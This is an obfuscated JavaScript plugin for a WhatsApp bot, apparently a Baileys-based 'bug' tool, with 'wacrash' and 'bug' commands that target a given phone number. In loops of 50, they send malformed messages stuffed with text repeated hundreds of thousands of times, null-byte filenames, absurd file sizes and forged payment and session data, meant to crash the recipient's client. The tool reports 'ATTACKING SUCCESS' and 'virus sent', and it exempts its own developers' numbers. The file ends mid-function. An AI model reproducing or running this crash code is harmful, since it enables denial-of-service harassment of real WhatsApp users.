const {
  cmd,
  commands
} = require("../command");
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
  jsonformat
} = require("../lib/functions");
const {
  beta1,
  beta2,
  buk1
} = require("../lib/hdr.js");
const {
  default: makeWASocket,
  generateWAMessageFromContent,
  proto
} = require("@whiskeysockets/baileys");
const _0x59e330 = {
  pattern: "wacrash",
  react: '🔖',
  desc: "To take owner number",
  category: "bug",
  use: ".bug 947xxxxx",
  filename: __filename
};
cmd(_0x59e330, async (_0x5ad06c, _0x426dc1, _0x1bba52, {
  from: _0x1978bd,
  prefix: _0x57abca,
  l: _0xed7702,
  quoted: _0x9b2de0,
  body: _0x53b75f,
  isCmd: _0x51a276,
  command: _0x437ccc,
  args: _0x14485d,
  q: _0x34608b,
  isGroup: _0x4d8cab,
  sender: _0x305159,
  senderNumber: _0x20d823,
  botNumber2: _0x4c2a6d,
  botNumber: _0x17645e,
  pushname: _0x424964,
  isMe: _0x1a4114,
  isOwner: _0xf34b99,
  groupMetadata: _0x3cbce5,
  groupName: _0x46dbd4,
  participants: _0x3a22d6,
  groupAdmins: _0x2047c1,
  isBotAdmins: _0x4bbe25,
  isAdmins: _0x418cb9,
  reply: _0x17fd71
}) => {
  try {
    if (!_0x1a4114) {
      return _0x17fd71("_</> owner only..._");
    }
    const _0x4b3534 = _0x3d2ecb => {
      const _0x3749ce = {
        showAdAttribution: true,
        containsAutoReply: true,
        title: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        body: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        previewType: "PHOTO",
        thumbnailUrl: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg",
        thumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg",
        sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z"
      };
      const _0x495526 = {
        mentionedJid: [_0x31b24f],
        forwardingScore: 0x98967f,
        isForwarded: true,
        externalAdReply: _0x3749ce
      };
      const _0x3d5799 = {
        text: _0x3d2ecb,
        contextInfo: _0x495526
      };
      _0x5ad06c.sendMessage(_0x1bba52.chat, _0x3d5799, {
        'quoted': _0x1bba52
      });
    };
    const _0x31b24f = _0x1bba52.key.fromMe ? _0x5ad06c.user.id.split(':')[0] + "@s.whatsapp.net" || _0x5ad06c : _0x1bba52.key.participant || _0x1bba52.key.remoteJid;
    var _0x219747 = _0x1bba52.mtype === "interactiveResponseMessage" ? JSON.parse(_0x1bba52.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x1bba52.mtype === "conversation" ? _0x1bba52.message.conversation : _0x1bba52.mtype == "imageMessage" ? _0x1bba52.message.imageMessage.caption : _0x1bba52.mtype == "videoMessage" ? _0x1bba52.message.videoMessage.caption : _0x1bba52.mtype == "extendedTextMessage" ? _0x1bba52.message.extendedTextMessage.text : _0x1bba52.mtype == "buttonsResponseMessage" ? _0x1bba52.message.buttonsResponseMessage.selectedButtonId : _0x1bba52.mtype == "listResponseMessage" ? _0x1bba52.message.listResponseMessage.singleSelectReply.selectedRowId : _0x1bba52.mtype == "templateButtonReplyMessage" ? _0x1bba52.message.templateButtonReplyMessage.selectedId : _0x1bba52.mtype == "messageContextInfo" ? _0x1bba52.message.buttonsResponseMessage?.["selectedButtonId"] || _0x1bba52.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x1bba52.text : '';
    const _0xe9b699 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x219747) ? _0x219747.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x145583 = _0x219747.replace(_0xe9b699, '').trim().split(/ +/).shift().toLowerCase();
    if (!_0x34608b) {
      return _0x4b3534("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*𝘊𝘰𝘯𝘵𝘰𝘩 " + (_0xe9b699 + _0x145583) + " 6289526156543*");
    }
    const _0x3894e6 = {
      remoteJid: 'p',
      fromMe: false,
      participant: "0@s.whatsapp.net"
    };
    const _0x59d49e = {
      text: "Sent",
      format: "DEFAULT"
    };
    const _0x1e8a28 = {
      'key': _0x3894e6,
      'message': {
        'interactiveResponseMessage': {
          'body': _0x59d49e,
          'nativeFlowResponseMessage': {
            'name': "galaxy_message",
            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            'version': 0x3
          }
        }
      }
    };
    const _0x3f9605 = {
      'participant': "0@s.whatsapp.net",
      ...(_0x1bba52.chat ? {
        'remoteJid': "status@broadcast"
      } : {})
    };
    const _0x3b6076 = {
      hasMediaAttachment: true,
      jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
    };
    const _0xa240a4 = {
      name: "review_and_pay",
      buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
    };
    const _0xa982e0 = {
      buttons: [_0xa240a4]
    };
    const _0x38b61d = {
      header: _0x3b6076,
      nativeFlowMessage: _0xa982e0
    };
    const _0x581090 = {
      interactiveMessage: _0x38b61d
    };
    const _0x4e918d = {
      key: _0x3f9605,
      message: _0x581090
    };
    const _0x5b6b92 = {
      'participant': "0@s.whatsapp.net",
      ...(_0x1bba52.chat ? {
        'remoteJid': "status@broadcast"
      } : {})
    };
    const _0x216311 = {
      hasMediaAttachment: true,
      jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
    };
    const _0x517556 = {
      name: "review_and_pay",
      buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
    };
    const _0x331d8a = {
      buttons: [_0x517556]
    };
    const _0x1ee19e = {
      header: _0x216311,
      nativeFlowMessage: _0x331d8a
    };
    const _0x188d46 = {
      interactiveMessage: _0x1ee19e
    };
    const _0x2a2013 = {
      key: _0x5b6b92,
      message: _0x188d46
    };
    async function _0x5eba34(_0x26a994, _0x50f08f, _0x4757e8 = true) {
      const _0x7757d4 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 0x4e729fff,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
      };
      const _0x2d5391 = {
        documentMessage: _0x7757d4,
        hasMediaAttachment: true
      };
      const _0x36e49b = {
        messageParamsJson: '{}'
      };
      await _0x5ad06c.relayMessage(_0x26a994, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x2d5391,
              'body': {
                'text': "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6289526156543".repeat(27000)
              },
              'nativeFlowMessage': _0x36e49b,
              'contextInfo': {
                'mentionedJid': ["6289526156543@s.whatsapp.net"],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, _0x4757e8 ? {
        'participant': {
          'jid': _0x26a994
        }
      } : {});
    }
    async function _0x2152d2(_0x1895e7, _0x2d601d, _0x2fad34 = false, _0x50b117 = false) {}
    async function _0x1c6462(_0xb1412e) {
      const _0x280422 = {
        degreesLatitude: 0x0,
        degreesLongitude: 0x0
      };
      const _0x1d55f2 = {
        locationMessage: _0x280422,
        hasMediaAttachment: true
      };
      const _0x53395a = {
        length: 0x5
      };
      const _0x47a0e2 = {
        messageId: null
      };
      await _0x5ad06c.relayMessage(_0xb1412e, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x1d55f2,
              'body': {
                'text': "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + 'ꦾ'.repeat(100000)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from(_0x53395a, () => "0@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': "0@s.whatsapp.net",
                  'groupSubject': "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0xb1412e
        }
      }, _0x47a0e2);
    }
    async function _0x580a8a(_0x4d20da) {
      const _0x48c333 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "99999999999",
        pageCount: 0x9184e729fff,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭",
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
      };
      const _0x11ad73 = {
        documentMessage: _0x48c333,
        hasMediaAttachment: true
      };
      const _0x2f826f = {
        length: 0x5
      };
      _0x5ad06c.relayMessage(_0x4d20da, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x11ad73,
              'body': {
                'text': "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + 'ꦾ'.repeat(100000) + '@1'.repeat(300000)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from(_0x2f826f, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x4d20da
        }
      });
    }
    ;
    async function _0xff7b1f(_0x26bf2a) {
      const _0x5ef43f = {
        messageId: null
      };
      _0x5ad06c.relayMessage(_0x26bf2a, {
        'extendedTextMessage': {
          'text': "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + '࣯ꦾ'.repeat(90000),
          'contextInfo': {
            'fromMe': false,
            'stanzaId': _0x26bf2a,
            'participant': _0x26bf2a,
            'quotedMessage': {
              'conversation': "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + 'ꦾ'.repeat(90000)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x26bf2a
        }
      }, _0x5ef43f);
    }
    async function _0x37dccb(_0x20981a) {
      const _0x48fa8b = {
        degreesLatitude: -999.035,
        degreesLongitude: 999.035
      };
      const _0x11190f = {
        locationMessage: _0x48fa8b,
        hasMediaAttachment: true
      };
      const _0x51f43d = {
        length: 0x5
      };
      await _0x5ad06c.relayMessage(_0x20981a, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x11190f,
              'body': {
                'text': '' + 'ꦾ'.repeat(50000) + '@X'.repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + 'ᬃᬃ'.repeat(90000) + '⿻'.repeat(90000)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from(_0x51f43d, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': "AngeLs`"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x20981a
        }
      });
    }
    ;
    async function _0x5417b1(_0x91987a, _0x5b64f7) {
      var _0x53876c = generateWAMessageFromContent(_0x91987a, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "*`𝐀𝐬𝐬𝐚𝐥𝐚𝐦𝐮𝐚𝐥𝐚𝐢𝐤𝐮𝐦 𝐦𝐚𝐬`*𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" + 'ꦾ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x91987a,
        'quoted': _0x5b64f7
      });
      await _0x5ad06c.relayMessage(_0x91987a, _0x53876c.message, {
        'participant': {
          'jid': _0x91987a
        },
        'messageId': _0x53876c.key.id
      });
    }
    async function _0xdb62cd(_0x3860de, _0xd6b34f) {
      var _0x6fade8 = generateWAMessageFromContent(_0x3860de, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': "penis",
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 0x3b9ac9ff,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "\0".repeat(900000),
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': "1715880173"
        }
      }), {
        'userJid': _0x3860de,
        'quoted': _0xd6b34f
      });
      await _0x5ad06c.relayMessage(_0x3860de, _0x6fade8.message, {
        'participant': {
          'jid': _0x3860de
        },
        'messageId': _0x6fade8.key.id
      });
    }
    async function _0x52f01f(_0x42b77d, _0x24b62c) {
      var _0x7fa565 = generateWAMessageFromContent(_0x42b77d, proto.Message.fromObject({
        'stickerMessage': {
          'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          'mimetype': "image/webp",
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': "10116",
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': false,
          'stickerSentTs': "1715881084144",
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false
        }
      }), {
        'userJid': _0x42b77d,
        'quoted': _0x24b62c
      });
      await _0x5ad06c.relayMessage(_0x42b77d, _0x7fa565.message, {
        'participant': {
          'jid': _0x42b77d
        },
        'messageId': _0x7fa565.key.id
      });
    }
    target = _0x34608b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    _0x4b3534("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*ᥕᥲі𝗍 𝖿᥆r 𝗍һᥱ ᑲ᥆𝗍 𝗍᥆ rᥱᥲᥴᥱ 𝗍᥆ 𝗍һᥱ ᥱm᥆ȷі 🎀*");
    for (let _0x857f66 = 0; _0x857f66 < 50; _0x857f66++) {
      await _0x5eba34(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x2152d2(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x5eba34(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x1c6462(target);
      await _0x580a8a(target);
      await _0xff7b1f(target);
      await _0x37dccb(target);
      await _0x5eba34(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x5417b1(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x52f01f(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x2152d2(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0xdb62cd(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x5eba34(target, _0x1e8a28, _0x4e918d, _0x2a2013);
      await _0x1c6462(target);
      await _0x580a8a(target);
      await _0xff7b1f(target);
      await _0x37dccb(target);
    }
    const _0x181fb7 = {
      text: '✅',
      key: _0x426dc1.key
    };
    const _0x17a02c = {
      react: _0x181fb7
    };
    await _0x5ad06c.sendMessage(_0x1978bd, _0x17a02c);
  } catch (_0x206452) {
    _0x17fd71("*Error !!*");
    _0xed7702(_0x206452);
  }
});
const _0x2c8512 = {
  pattern: "bug",
  react: '🔖',
  desc: "To take owner number",
  category: "bug"
};
function _0x140573(_0x4297b8, _0x3814d8, _0x13a17a, _0x4c0c4c, _0x280818) {
  return _0x1ca0(_0x13a17a + 0x233, _0x4c0c4c);
}
_0x2c8512.use = ".bug 947xxxxx";
_0x2c8512.filename = __filename;
function _0x1baf25(_0x5156aa, _0x1070e3, _0x3d0296, _0x400c1c, _0x9fc4d2) {
  return _0x1ca0(_0x3d0296 + 0x11a, _0x5156aa);
}
function _0x5ca321(_0x17f900, _0x307f61, _0x1459e4, _0x5d6a0f, _0x4db520) {
  return _0x1ca0(_0x5d6a0f - 0x164, _0x1459e4);
}
function _0x10bc48(_0x1f2536, _0x398cf9, _0x2c296f, _0x3b4fa0, _0x5982a7) {
  return _0x1ca0(_0x5982a7 - 0x395, _0x2c296f);
}
cmd(_0x2c8512, async (_0x18d5ed, _0x447588, _0x2b6bb2, {
  from: _0x4a8bcd,
  prefix: _0x1da491,
  l: _0x26c9f1,
  quoted: _0x3d2fae,
  body: _0x467cd9,
  isCmd: _0x3485f1,
  command: _0x5674f6,
  args: _0x1105b8,
  q: _0x5562fa,
  isGroup: _0x414336,
  sender: _0x47d5ca,
  senderNumber: _0x3bbae4,
  botNumber2: _0x5cfd41,
  botNumber: _0x2aacc7,
  pushname: _0x23ac56,
  isMe: _0x2e927f,
  isOwner: _0x1bf0ce,
  groupMetadata: _0xb7e35f,
  groupName: _0x1ca6b5,
  participants: _0x173121,
  groupAdmins: _0x33edfc,
  isBotAdmins: _0x3608b0,
  isAdmins: _0x9c8ebf,
  reply: _0x49ae6b
}) => {
  try {
    if (!_0x2e927f) {
      return _0x49ae6b("_</> owner only..._");
    }
    if (_0x4a8bcd.includes("94719199757") || _0x4a8bcd.includes("94703475691") || _0x4a8bcd.includes("94711453361")) {
      return _0x49ae6b("Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!\n මෝඩ පොන්නය මට ගහන්න ඉයා කක්ක දාලා වරෙන්");
    }
    if (_0x4a8bcd.includes("120363026309634278@g.us") || _0x4a8bcd.includes("120363028400218278@g.us")) {
      return _0x49ae6b("Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!");
    }
    if (!_0x5562fa) {
      return _0x49ae6b("Example: " + (_0x1da491 + _0x5674f6) + " 62×××");
    }
    async function _0x3112de(_0x367262, _0x178c08, _0x938444, _0x29126f, _0x15f1a0, _0x263642, _0x597d9a, _0x23d24c) {
      const _0x2c1581 = {
        filterName: _0x178c08,
        parameters: _0x938444,
        filterResult: _0x29126f,
        clientNotSupportedConfig: _0x15f1a0
      };
      const _0x104ff2 = {
        clauseType: _0x263642,
        clauses: _0x597d9a,
        filters: _0x23d24c
      };
      const _0xbdfc5 = {
        filter: _0x2c1581,
        filterClause: _0x104ff2
      };
      const _0x32636f = {
        'qp': _0xbdfc5
      };
      var _0x43fadf = generateWAMessageFromContent(_0x367262, proto.Message.fromObject(_0x32636f), {
        'userJid': _0x367262
      });
      await _0x18d5ed.relayMessage(_0x367262, _0x43fadf.message, {
        'participant': {
          'jid': _0x367262
        },
        'messageId': _0x43fadf.key.id
      });
    }
    async function _0x50f068(_0x27014d, _0x1db85e, _0x18f2c8, _0x4c5009, _0x2ae57b, _0x158dc2, _0x3823c0, _0x594731, _0x447e3f, _0x5c7a66, _0x5701e6, _0x4f82f2, _0x2fbca5, _0x18f724) {
      const _0x42d022 = {
        sessionVersion: _0x1db85e,
        localIdentityPublic: _0x18f2c8,
        remoteIdentityPublic: _0x4c5009,
        rootKey: _0x2ae57b,
        previousCounter: _0x158dc2,
        senderChain: _0x3823c0,
        receiverChains: _0x594731,
        pendingKeyExchange: _0x447e3f,
        pendingPreKey: _0x5c7a66,
        remoteRegistrationId: _0x5701e6,
        localRegistrationId: _0x4f82f2,
        needsRefresh: _0x2fbca5,
        aliceBaseKey: _0x18f724
      };
      const _0x528314 = {
        sessionStructure: _0x42d022
      };
      var _0x44fcb0 = generateWAMessageFromContent(_0x27014d, proto.Message.fromObject(_0x528314), {
        'userJid': _0x27014d
      });
      await _0x18d5ed.relayMessage(_0x27014d, _0x44fcb0.message, {
        'participant': {
          'jid': _0x27014d
        },
        'messageId': _0x44fcb0.key.id
      });
    }
    const _0x32a8e1 = {
      remoteJid: 'p',
      fromMe: false,
      participant: "0@s.whatsapp.net"
    };
    const _0x20f477 = {
      text: "Sent",
      format: "DEFAULT"
    };
    const _0x38010e = {
      'key': _0x32a8e1,
      'message': {
        'interactiveResponseMessage': {
          'body': _0x20f477,
          'nativeFlowResponseMessage': {
            'name': "galaxy_message",
            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            'version': 0x3
          }
        }
      }
    };
    target = _0x5562fa.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    _0x49ae6b("𝙋𝙧𝙤𝙘𝙘𝙚𝙨 👾");
    for (let _0x4cd308 = 0; _0x4cd308 < 50; _0x4cd308++) {
      await buk1(_0x18d5ed, target, 'p', 1020000, ptcp = true);
      _0x3112de(target, _0x38010e);
      await _0x3112de(target, _0x38010e);
      await beta2(_0x18d5ed, target, _0x38010e);
      await _0x50f068(target, _0x38010e);
      await beta1(_0x18d5ed, target, _0x38010e);
    }
    _0x49ae6b("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
    const _0x617188 = {
      text: '✅',
      key: _0x447588.key
    };
    const _0x4db1a2 = {
      react: _0x617188
    };
